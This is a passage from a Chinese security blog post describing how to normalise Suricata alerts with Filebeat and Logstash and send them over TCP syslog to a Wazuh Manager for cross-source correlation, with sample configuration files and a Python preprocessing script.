fin.&#x27;</span>)</span><br></pre></td></tr></table></figure>


      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="http://example.com/2020/02/25/Wazuh-%E5%A6%82%E4%BD%95%E5%AF%B9%E5%BC%82%E6%9E%84%E6%95%B0%E6%8D%AE%E8%BF%9B%E8%A1%8C%E5%85%B3%E8%81%94%E5%91%8A%E8%AD%A6/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="Canon">
      <meta itemprop="description" content="一个热爱健身的安全分析师">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Canon's Blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2020/02/25/Wazuh-%E5%A6%82%E4%BD%95%E5%AF%B9%E5%BC%82%E6%9E%84%E6%95%B0%E6%8D%AE%E8%BF%9B%E8%A1%8C%E5%85%B3%E8%81%94%E5%91%8A%E8%AD%A6/" class="post-title-link" itemprop="url">Wazuh - 如何对异构数据进行关联告警</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>

      <time title="创建时间：2020-02-25 22:37:40" itemprop="dateCreated datePublished" datetime="2020-02-25T22:37:40+08:00">2020-02-25</time>
    </span>
      <span class="post-meta-item">
        <span class="post-meta-item-icon">
          <i class="far fa-calendar-check"></i>
        </span>
        <span class="post-meta-item-text">更新于</span>
        <time title="修改时间：2020-03-16 14:34:53" itemprop="dateModified" datetime="2020-03-16T14:34:53+08:00">2020-03-16</time>
      </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-folder"></i>
      </span>
      <span class="post-meta-item-text">分类于</span>
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/HIDS%E3%80%81NIDS/" itemprop="url" rel="index"><span itemprop="name">HIDS、NIDS</span></a>
        </span>
    </span>

  
      </div>
      <div class="post-meta">
    <span class="post-meta-item" title="本文字数">
      <span class="post-meta-item-icon">
        <i class="far fa-file-word"></i>
      </span>
      <span class="post-meta-item-text">本文字数：</span>
      <span>11k</span>
    </span>
    <span class="post-meta-item" title="阅读时长">
      <span class="post-meta-item-icon">
        <i class="far fa-clock"></i>
      </span>
      <span class="post-meta-item-text">阅读时长 &asymp;</span>
      <span>10 分钟</span>
    </span>
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <p><strong>写在前面</strong></p>
<p>​       这并不是什么<strong>高精尖</strong>的架构与技术。这只是我个人在工作中结合目前手头的资源进行了一些<strong>整合</strong> 。当然实现这些需求的方法有很多, 有钱的可以考虑Splunk, 没钱的有研发的团队的可以上Flink、Esper 。 </p>
<h4 id="需求"><a href="#需求" class="headerlink" title="需求"></a>需求</h4><p>​    由于攻防对抗的升级, 通过单一的数据源很难直接断言攻击是否成功。因此, 我们需要结合多个数据源进行安全事件的关联, 从中提炼出可靠性较高的安全告警进行人工排查。例如: 针对WebShell上传类的, 可以通过<strong>网络流量 + 终端</strong>进行关联; 针对Web攻击类, 可以通过<strong>WAF + NIDS</strong>的事件关联, 得到Bypass WAF 的安全告警。</p>
<h4 id="解决思路"><a href="#解决思路" class="headerlink" title="解决思路"></a>解决思路</h4><p>​    虽然Wazuh本身具备安全事件的关联能力, 但在传统的部署架构中, 通常是由Wazuh Agent将安全事件发送到Wazuh Manager,通过Manager进行安全事件的关联告警。由于缺少了对数据进行ETL, 使得Wazuh Manager很难对异构数据进行关联。因此, 我们需要通过Logstash实现对数据的标准化, 并将标准化后的数据通过Syslog的形式发送到Wazuh Manager, 从而进行异构数据的关联。</p>
<h5 id="坑点"><a href="#坑点" class="headerlink" title="坑点"></a>坑点</h5><ol>
<li>本次改造采用了<strong>Syslog</strong>的形式将数据发送到Wazuh Manager端进行数据关联。由于<strong>Syslog</strong> 默认采用了<strong>UDP</strong>协议进行数据传输, 当数据发送过大时将会导致<strong>数据截断</strong>的报错。针对此问题, 需改用<strong>TCP</strong>的形式进行数据发送规避此问题。</li>
<li>Wazuh Manager 部分告警缺少”<strong>必要</strong>“关联字段的现象。如: 本次场景中<code>syscheck</code>告警事件, 默认不会携带<code>srcip</code>的字段, 对于此问题可以通过在Manager上编写一个预处理脚本来解决。</li>
</ol>
<h4 id="改造"><a href="#改造" class="headerlink" title="改造"></a>改造</h4><ol>
<li><h5 id="改造之前"><a href="#改造之前" class="headerlink" title="改造之前:"></a>改造之前:</h5><p>Suricata (Wazuh agent) —(Agent: UDP 1514)—&gt; Wazuh Manager</p>
</li>
<li><h5 id="改造之后"><a href="#改造之后" class="headerlink" title="改造之后:"></a>改造之后:</h5><p>所有的标准化都由Logstash来进行, Filebeat只需要做’<strong>无脑</strong>‘转发即可。</p>
</li>
</ol>
<p><strong>workflow:</strong></p>
<p><img src="/2020/02/25/Wazuh-%E5%A6%82%E4%BD%95%E5%AF%B9%E5%BC%82%E6%9E%84%E6%95%B0%E6%8D%AE%E8%BF%9B%E8%A1%8C%E5%85%B3%E8%81%94%E5%91%8A%E8%AD%A6/image-20200303215020561.png" alt="image-20200303215020561"></p>
<hr>
<h5 id="Filebeat配置"><a href="#Filebeat配置" class="headerlink" title="Filebeat配置"></a>Filebeat配置</h5><ul>
<li><h6 id="filebeat-yaml"><a href="#filebeat-yaml" class="headerlink" title="filebeat.yaml"></a>filebeat.yaml</h6></li>
</ul>
<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#=========================== Filebeat inputs =============================</span></span><br><span class="line"><span class="attr">filebeat.inputs:</span></span><br><span class="line"><span class="bullet">-</span> <span class="attr">type:</span> <span class="string">log</span></span><br><span class="line">  <span class="attr">paths:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">&quot;/var/log/suricata/alert-*.json&quot;</span></span><br><span class="line">  <span class="attr">fields_under_root:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">fields:</span> &#123; <span class="attr">application:</span> <span class="string">suricata</span> &#125;</span><br><span class="line">  <span class="attr">json.keys_under_root:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">json.overwrite_keys:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">json.message_key:</span> <span class="string">log</span></span><br><span class="line">  <span class="attr">tail_files:</span> <span class="literal">false</span></span><br><span class="line"></span><br><span class="line">  <span class="attr">scan_frequency:</span> <span class="string">1s</span></span><br><span class="line">  <span class="attr">harvester_buffer_size:</span> <span class="number">104857600</span></span><br><span class="line">  <span class="attr">backoff:</span> <span class="string">1s</span></span><br><span class="line">  <span class="attr">max_backoff:</span> <span class="string">10s</span></span><br><span class="line">  <span class="attr">close_timeout:</span> <span class="string">30m</span></span><br><span class="line">  <span class="attr">close_inactive:</span> <span class="string">10m</span></span><br><span class="line">  <span class="attr">clean_inactive:</span> <span class="string">72h</span></span><br><span class="line">  <span class="attr">ignore_older:</span> <span class="string">70h</span></span><br><span class="line">  <span class="attr">registry_file:</span> <span class="string">/etc/filebeat/registry/wazuh/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#================================ Processors ==================================</span></span><br><span class="line"><span class="attr">processors:</span></span><br><span class="line"><span class="bullet">-</span> <span class="attr">drop_fields:</span></span><br><span class="line">    <span class="attr">fields:</span> [<span class="string">&quot;ecs.version&quot;</span>, <span class="string">&quot;agent.ephemeral_id&quot;</span>, <span class="string">&quot;agent.version&quot;</span>, <span class="string">&quot;agent.type&quot;</span>, <span class="string">&quot;agent.id&quot;</span>, <span class="string">&quot;agent.ephemeral_id&quot;</span>, <span class="string">&quot;input.type&quot;</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment">#================================ Outputs =====================================</span></span><br><span class="line"><span class="attr">output.logstash:</span></span><br><span class="line">  <span class="attr">hosts:</span> [<span class="string">&quot;logstash:5010&quot;</span>]</span><br><span class="line">  <span class="attr">loadbalance:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">worker:</span> <span class="number">4</span></span><br><span class="line">  <span class="attr">compression_level:</span> <span class="number">3</span></span><br><span class="line">  <span class="attr">bulk_max_size:</span> <span class="number">4096</span></span><br></pre></td></tr></table></figure>

<hr>
<h5 id="Logstash配置"><a href="#Logstash配置" class="headerlink" title="Logstash配置"></a>Logstash配置</h5><ul>
<li><h6 id="00-input-conf"><a href="#00-input-conf" class="headerlink" title="00_input.conf"></a>00_input.conf</h6></li>
</ul>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">input &#123;</span><br><span class="line">  beats &#123;</span><br><span class="line">    port =&gt; 5010</span><br><span class="line">    codec =&gt; <span class="string">&quot;json_lines&quot;</span></span><br><span class="line">    tags =&gt; [<span class="string">&quot;beats&quot;</span>]</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li><h6 id="50-suricata-conf"><a href="#50-suricata-conf" class="headerlink" title="50_suricata.conf"></a>50_suricata.conf</h6></li>
</ul>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">filter &#123;</span><br><span class="line">  <span class="keyword">if</span> [application] == <span class="string">&quot;suricata&quot;</span> &#123;</span><br><span class="line">    date &#123;</span><br><span class="line">      match =&gt; [ <span class="string">&quot;timestamp&quot;</span>, <span class="string">&quot;ISO8601&quot;</span> ]</span><br><span class="line">      target =&gt; <span class="string">&quot;timestamp&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li><h6 id="mapping-json"><a href="#mapping-json" class="headerlink" title="mapping.json"></a>mapping.json</h6></li>
</ul>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">&quot;common_mapping&quot;</span>: &#123;</span><br><span class="line">        <span class="attr">&quot;src_ip&quot;</span>: <span class="string">&quot;srcip&quot;</span>,</span><br><span class="line">        <span class="attr">&quot;dest_ip&quot;</span>: <span class="string">&quot;dstip&quot;</span>,</span><br><span class="line">        <span class="attr">&quot;src_port&quot;</span>: <span class="string">&quot;srcport&quot;</span>,</span><br><span class="line">        <span class="attr">&quot;dest_port&quot;</span>: <span class="string">&quot;dstport&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li><h6 id="70-normalized-suricata-conf"><a href="#70-normalized-suricata-conf" class="headerlink" title="70_normalized-suricata.conf"></a>70_normalized-suricata.conf</h6></li>
</ul>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">filter &#123;</span><br><span class="line">  <span class="built_in">clone</span> &#123;</span><br><span class="line">    clones =&gt; [ <span class="string">&quot;siem_events&quot;</span> ]</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">filter &#123;</span><br><span class="line">  <span class="keyword">if</span> [<span class="built_in">type</span>] == <span class="string">&quot;siem_events&quot;</span> &#123;</span><br><span class="line">    mutate &#123;</span><br><span class="line">      remove_field =&gt; [ <span class="string">&quot;application&quot;</span>, <span class="string">&quot;type&quot;</span>, <span class="string">&quot;agent&quot;</span>, <span class="string">&quot;@version&quot;</span>, <span class="string">&quot;@timestamp&quot;</span>]</span><br><span class="line">      add_field =&gt; &#123;</span><br><span class="line">        <span class="string">&quot;provider&quot;</span> =&gt; <span class="string">&quot;Suricata&quot;</span></span><br><span class="line">        <span class="string">&quot;product&quot;</span> =&gt; <span class="string">&quot;Intrusion Detection System&quot;</span></span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ruby &#123;</span><br><span class="line">      init =&gt; <span class="string">&quot;</span></span><br><span class="line"><span class="string">        require &#x27;json&#x27;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        mapping_json = File.read(&#x27;/etc/logstash/mappings/wazuh/mapping.json&#x27;)</span></span><br><span class="line"><span class="string">        mapping = JSON.parse(mapping_json)</span></span><br><span class="line"><span class="string">        @common_mapping = mapping[&#x27;common_mapping&#x27;]</span></span><br><span class="line"><span class="string">      &quot;</span></span><br><span class="line"></span><br><span class="line">      code =&gt; <span class="string">&quot;</span></span><br><span class="line"><span class="string">        keys = event.to_hash.keys</span></span><br><span class="line"><span class="string">        keys.each do |key|</span></span><br><span class="line"><span class="string">            if @common_mapping.include? key then</span></span><br><span class="line"><span class="string">                value = event.get(key)</span></span><br><span class="line"><span class="string">                event.remove(key)</span></span><br><span class="line"><span class="string">                new_key = @common_mapping[key]</span></span><br><span class="line"><span class="string">                event.set(new_key, value)</span></span><br><span class="line"><span class="string">            end</span></span><br><span class="line"><span class="string">        end</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        sensor = event.get(&#x27;[host][name]&#x27;)</span></span><br><span class="line"><span class="string">        event.set(&#x27;sensor&#x27;, sensor)</span></span><br><span class="line"><span class="string">      &quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li><h6 id="99-output-elasticsearch-conf"><a href="#99-output-elasticsearch-conf" class="headerlink" title="99_output-elasticsearch.conf"></a>99_output-elasticsearch.conf</h6></li>
</ul>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">output &#123;</span><br><span class="line">  <span class="keyword">if</span> [event_type] == <span class="string">&quot;alert&quot;</span> &#123;</span><br><span class="line">    elasticsearch &#123;</span><br><span class="line">      cacert =&gt; <span class="string">&quot;/etc/logstash/certs/ca/ca.crt&quot;</span></span><br><span class="line">      user =&gt; <span class="string">&quot;elastic&quot;</span></span><br><span class="line">      password =&gt; <span class="string">&quot;Hello World!&quot;</span></span><br><span class="line">      hosts =&gt; [<span class="string">&quot;https://elasticsearch:9200&quot;</span>]</span><br><span class="line">      index =&gt; <span class="string">&quot;suricata-%&#123;+YYYY.MM.dd&#125;&quot;</span></span><br><span class="line">      template =&gt; <span class="string">&quot;/etc/logstash/index-template.d/suricata-template.json&quot;</span></span><br><span class="line">      template_name =&gt; <span class="string">&quot;suricata&quot;</span></span><br><span class="line">      template_overwrite =&gt; <span class="literal">true</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li><h6 id="99-output-wazuh-conf"><a href="#99-output-wazuh-conf" class="headerlink" title="99_output-wazuh.conf"></a>99_output-wazuh.conf</h6></li>
</ul>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">output &#123;</span><br><span class="line">  <span class="keyword">if</span> [provider] == <span class="string">&quot;Suricata&quot;</span> &#123;</span><br><span class="line">    syslog &#123;</span><br><span class="line">        host =&gt; <span class="string">&quot;wazuh&quot;</span></span><br><span class="line">        protocol =&gt; <span class="string">&quot;tcp&quot;</span></span><br><span class="line">        port =&gt; 514</span><br><span class="line">        codec =&gt; <span class="string">&quot;json&quot;</span></span><br><span class="line">        sourcehost =&gt; <span class="string">&quot;logstash&quot;</span></span><br><span class="line">        appname =&gt; <span class="string">&quot;NORMALIZED&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">#stdout &#123;</span></span><br><span class="line">        <span class="comment">#codec =&gt; rubydebug</span></span><br><span class="line">    <span class="comment">#&#125;</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<hr>
<h5 id="Wazuh配置"><a href="#Wazuh配置" class="headerlink" title="Wazuh配置"></a>Wazuh配置</h5><ul>
<li><h6 id="custom-syscheck-py"><a href="#custom-syscheck-py" class="headerlink" title="custom-syscheck.py"></a>custom-syscheck.py</h6><p>Wazuh Manager 新增预处理脚本对指定的安全事件进行预处理。如: syscheck事件增加<code>srcip</code>字段。</p>
</li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> datetime <span class="keyword">import</span> datetime, timedelta, timezone</span><br><span class="line"></span><br><span class="line"><span class="comment"># ossec.conf configuration:</span></span><br><span class="line"><span class="comment">#  &lt;integration&gt;</span></span><br><span class="line"><span class="comment">#      &lt;name&gt;custom-syscheck&lt;/name&gt;</span></span><br><span class="line"><span class="comment">#      &lt;rule_id&gt;554&lt;/rule_id&gt;</span></span><br><span class="line"><span class="comment">#      &lt;group&gt;syscheck&lt;/group&gt;</span></span><br><span class="line"><span class="comment">#      &lt;alert_format&gt;json&lt;/alert_format&gt;</span></span><br><span class="line"><span class="comment">#  &lt;/integration&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Global vars</span></span><br><span class="line">debug_enabled = <span class="literal">False</span></span><br><span class="line">pwd = os.path.dirname(os.path.dirname(os.path.realpath(__file__)))</span><br><span class="line">json_alert = &#123;&#125;</span><br><span class="line">now = time.strftime(<span class="string">&quot;%a %b %d %H:%M:%S %Z %Y&quot;</span>)</span><br><span class="line">wazuh_server = <span class="string">&quot;192.168.199.97&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Set paths</span></span><br><span class="line">log_file = <span class="string">&#x27;&#123;0&#125;/logs/integrations.log&#x27;</span>.<span class="built_in">format</span>(pwd)</span><br><span class="line">syscheck_file = <span class="string">&#x27;&#123;0&#125;/logs/syscheck.json&#x27;</span>.<span class="built_in">format</span>(pwd)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">iso8601</span>(<span class="params">hours=<span class="number">8</span></span>):</span></span><br><span class="line">    td = timedelta(hours=hours)</span><br><span class="line">    tz = timezone(td)</span><br><span class="line">    <span class="keyword">return</span> datetime.now(tz=tz).isoformat()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>(<span class="params">args</span>):</span></span><br><span class="line">    debug(<span class="string">&quot;# Starting&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Read args</span></span><br><span class="line">    alert_file_location = args[<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">    debug(<span class="string">&quot;# File location&quot;</span>)</span><br><span class="line">    debug(alert_file_location)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Load alert. Parse JSON object.</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(alert_file_location) <span class="keyword">as</span> alert_file:</span><br><span class="line">        json_alert = json.load(alert_file)</span><br><span class="line">    debug(<span class="string">&quot;# Processing alert&quot;</span>)</span><br><span class="line">    debug(json_alert)</span><br><span class="line"></span><br><span class="line">    alert = normalized_data(json_alert)</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(syscheck_file, <span class="string">&#x27;a&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        msg = json.dumps(alert)</span><br><span class="line">        f.write(msg + <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span>(<span class="params">msg</span>):</span></span><br><span class="line">    <span class="keyword">if</span> debug_enabled:</span><br><span class="line">        msg = <span class="string">&quot;&#123;0&#125;: &#123;1&#125;\n&quot;</span>.<span class="built_in">format</span>(now, msg)</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(log_file, <span class="string">&quot;a&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            f.write(msg)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">normalized_data</span>(<span class="params">alert</span>):</span></span><br><span class="line">    <span class="keyword">if</span> alert[<span class="string">&#x27;agent&#x27;</span>][<span class="string">&#x27;id&#x27;</span>] == <span class="string">&#x27;000&#x27;</span>:</span><br><span class="line">        alert[<span class="string">&#x27;srcip&#x27;</span>] = wazuh_server</span><br><span class="line">    <span class="keyword">elif</span> alert[<span class="string">&#x27;agent&#x27;</span>].get(<span class="string">&#x27;ip&#x27;</span>):</span><br><span class="line">        alert[<span class="string">&#x27;srcip&#x27;</span>] = alert[<span class="string">&#x27;agent&#x27;</span>][<span class="string">&#x27;ip&#x27;</span>]</span><br><span class="line">        alert[<span class="string">&#x27;dstip&#x27;</span>] = alert[<span class="string">&#x27;agent&#x27;</span>][<span class="string">&#x27;ip&#x27;</span>]</span><br><span class="line">    alert[<span class="string">&#x27;integration&#x27;</span>] = <span class="string">&#x27;custom-syscheck&#x27;</span></span><br><span class="line">    alert[<span class="string">&#x27;create_timestamp&#x27;</span>] = iso8601()</span><br><span class="line">    debug(alert)</span><br><span class="line">    <span class="keyword">return</span>(alert)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="comment"># Read arguments</span></span><br><span class="line">        bad_arguments = <span class="literal">False</span></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(sys.argv) &gt;= <span class="number">4</span>:</span><br><span class="line">            msg = <span class="string">&#x27;&#123;0&#125; &#123;1&#125; &#123;2&#125; &#123;3&#125; &#123;4&#125;&#x27;</span>.<span class="built_in">format</span>(now, sys.argv[<span class="number">1</span>], sys.argv[<span class="number">2</span>], sys.argv[<span class="number">3</span>], sys.argv[<span class="number">4</span>] <span class="keyword">if</span> <span class="built_in">len</span>(sys.argv) &gt; <span class="number">4</span> <span class="keyword">else</span> <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            msg = <span class="string">&#x27;&#123;0&#125; Wrong arguments&#x27;</span>.<span class="built_in">format</span>(now)</span><br><span class="line">            bad_arguments = <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># Logging the call</span></span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(log_file, <span class="string">&#x27;a&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            f.write(msg + <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> bad_arguments:</span><br><span class="line">            debug(<span class="string">&quot;# Exiting: Bad arguments.&quot;</span>)</span><br><span class="line">            sys.exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># Main function</span></span><br><span class="line">        main(sys.argv)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        debug(<span class="built_in">str</span>(e))</span><br><span class="line">        <span class="keyword">raise</span></span><br></pre></td></tr></table></figure>

<ul>
<li><h6 id="ossec-conf"><a href="#ossec-conf" class="headerlink" title="ossec.conf"></a>ossec.conf</h6><ul>
<li>配置syslog选用<strong>TCP</strong>协议;</li>
<li>加载预处理脚本;</li>
<li>加载脚本输出日志;</li>
</ul>
</li>
</ul>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">ossec_config</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">remote</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">connection</span>&gt;</span>syslog<span class="tag">&lt;/<span class="name">connection</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">port</span>&gt;</span>514<span class="tag">&lt;/<span class="name">port</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">protocol</span>&gt;</span>tcp<span class="tag">&lt;/<span class="name">protocol</span>&gt;</span> <span class="comment">&lt;!-- udp(default)/tcp --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">allowed-ips</span>&gt;</span>192.168.199.0/24<span class="tag">&lt;/<span class="name">allowed-ips</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">remote</span>&gt;</span></span><br><span class="line">  </span><br><span class="line">  <span class="comment">&lt;!-- 